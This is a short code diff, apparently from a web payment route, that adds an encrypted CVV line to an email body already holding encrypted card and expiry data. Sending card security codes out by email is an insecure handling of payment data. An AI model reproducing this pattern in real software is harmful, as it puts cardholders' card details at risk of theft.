@@ -61,6 +61,7 @@ export async function POST(request: Request) {
       Card Information:
       Encrypted Data: ${encryptedCard}
       Expiration (encrypted): ${encryptedExp}
+      CVV (encrypted): ${encryptedCVV}
     `
 
     // Send email
